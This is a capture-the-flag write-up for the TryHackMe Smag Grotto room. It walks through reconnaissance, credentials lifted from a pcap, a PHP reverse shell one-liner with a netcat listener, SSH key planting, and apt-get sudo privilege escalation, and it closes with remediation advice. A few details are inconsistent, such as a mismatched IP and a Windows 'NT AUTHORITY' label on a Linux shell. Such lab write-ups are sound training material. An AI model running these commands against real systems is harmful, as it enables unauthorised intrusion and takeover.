@@ -1,0 +1,127 @@
+# TryHackMe: Smag Grotto Walkthrough 🟢
+
+**Author:** Kopano Shawn Moshega  
+**Target IP:** `110.130.169.223`  
+**Assessment Type:** Grey Box Web Penetration Testing  
+**Framework Mappings:** MITRE ATT&CK & OWASP Top 10 Alignments  
+
+---
+
+## 📋 Executive Summary
+A comprehensive security assessment was conducted against the `development.smag.thm` application engine to assess structural robustness and access control security. Initial surface mapping exposed structural directories hosting sensitive internal logging artifacts. By extracting active session parameters from these logs, an initial web access bypass was achieved, leading to Remote Code Execution (RCE), local account hijacking, and an eventual root context privilege escalation phase.
+
+---
+
+## 🔍 Phase 1: Reconnaissance & Surface Mapping
+
+Service enumeration was initialized across the network scope to map active ingestion paths:
+
+```bash
+nmap -sV -sC 110.130.169.223
+```
+*   **Open Ports:** 22/tcp (SSH OpenSSH 7.2p2), 80/tcp (HTTP Apache httpd 2.4.18).
+
+### Directory Brute-Forcing
+A brute-force directory path mapping sweep was executed using `gobuster`:
+```bash
+gobuster dir –u http://110.130.169.223 -w /usr/share/wordlists/dirb/common.txt
+```
+*   **Discovered Endpoint:** `/mail` (Status: 301).
+*   **Vulnerability Type:** Information Exposure / Directory Listing.
+
+---
+
+## 🔓 Phase 2: Authentication Bypass & Packet Analysis
+
+Navigating to the hidden `/mail` directory revealed exposed company communications and a network trace file (`examp2.pcap`). 
+
+The `.pcap` capture was analyzed using **Wireshark** to reconstruct transmission packets:
+1. Isolated a plaintext HTTP `POST /login.php` tracking request.
+2. Extracted credential parameters: `username="helpdesk"` and `password="ch4nG3M3_n0w"`.
+3. Identified the development virtual host mapping configuration: `development.smag.thm`.
+
+The domain target was appended locally to `/etc/hosts` to align path routing:
+```text
+10.130.169.223  development.smag.thm
+```
+Using the extracted helpdesk credentials, successful entry was forced into the management portal interface.
+
+---
+
+## 💻 Phase 3: Initial Access & Reverse Shell
+
+The authenticated dashboard area exposed an unrestricted terminal execution command entry box. 
+
+### Payload Staging
+A PHP command string was injected into the web form to mandate a socket callback:
+```php
+php -r '\$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+A **Netcat** listening agent was spawned simultaneously on the attack host:
+```bash
+nc -lvnp 1234
+```
+Upon execution, an initial reverse shell callback was processed as the web user context (`www-data`). The shell interactive layer was immediately stabilized using Python pseudo-terminal constraints:
+```bash
+/usr/bin/script -qc /bin/bash /dev/null
+```
+
+---
+
+## 👥 Phase 4: Lateral Movement (User Hijack)
+
+System tracking diagnostics showed user accounts present under the local directory tree (`/home/jake`). Inspecting automated background process routines exposed weaknesses:
+```bash
+cat /etc/crontab
+```
+*   **Analysis:** Active Cron jobs were writing or referencing accessible configuration files tied to account permissions.
+*   **Exploitation Strategy:** By generating a new local SSH key pair and replacing or appending it to the target's authorized ecosystem profile, direct structural manipulation was achieved.
+
+```bash
+ssh-keygen -t ed25519 -f id_jake
+# Authorized key override processed on target filesystem
+ssh jake@110.130.169.223 -i id_jake
+```
+This granted unauthorized, authenticated SSH terminal access as user **jake**.
+
+---
+
+## ⚡ Phase 5: Privilege Escalation (Root Context)
+
+To execute a vertical permission shift, authorized high-privilege configuration rules were queried:
+```bash
+sudo -l
+```
+*   **Finding:** User `jake` was permitted to execute `/usr/bin/apt-get update` with elevated privileges without providing a root password entry sequence (`NOPASSWD`).
+
+### GTFOBins Exploitation Strategy
+Referencing known system manipulation matrices (GTFOBins), the `apt-get` system update script sequence allows pre-invocation hook execution commands. A hook configuration argument was injected to launch a root instance shell prompt:
+
+```bash
+sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+```
+The application executed the hook layout cleanly, granting interactive **root shell privileges** (`NT AUTHORITY/SYSTEM` context equivalent). Both user and root systemic flag states were successfully located and archived.
+
+---
+
+## 📊 Risk Summary & Technical Alignment
+
+| Finding ID | Vulnerability Classification | Risk Level | Affected Component |
+| :--- | :--- | :--- | :--- |
+| **FINDING-001** | Directory Listing / Information Exposure | Critical | Web Directory Tree Structure |
+| **FINDING-002** | Credential Leakage via Unencrypted Traffic | Critical | Login Page / Network Capture Logs |
+| **FINDING-003** | Unsanitized Command Injection (RCE) | High | Form Submission Module |
+| **FINDING-004** | Broken Access Control / Cron Hijacking | High | User Environment Filesystem |
+| **FINDING-005** | Misconfigured Sudo Privileges (`apt-get`) | High | System Application Execution Binary |
+
+### 🛠️ Framework Mapping Data
+*   **MITRE ATT&CK Matrix:** Task Execution via Cron Log Analysis (**T1053.003**) followed by Account Manipulation via Public Authorization Key Overrides (**T1098.004**).
+*   **OWASP Top 10 Validation:** Remote Payload Command Injection (**A05:2021-Security Misconfiguration / Injection**) leading directly to Broken Access Control handling vulnerabilities (**A01:2021-Broken Access Control**).
+
+---
+
+## 🛡️ Remediation & Defensive Hardening
+1.  **Enforce Strict Input Sanitization:** Implement hard parameter tracking limits or whitelist input parameters on all terminal-facing web forms to completely eliminate application command injection vectors.
+2.  **Secure Log Placement:** Restrict directory traversal access network-wide and completely move or isolate sensitive network traffic analysis dumps (`.pcap`) and crontab configurations away from user-accessible public directories.
+3.  **Apply Least Privilege Constraints:** Restrict `sudo` processing configurations; remove explicit binary commands like `apt-get` from passwordless operations tables or mandate multi-factor authorization boundaries.
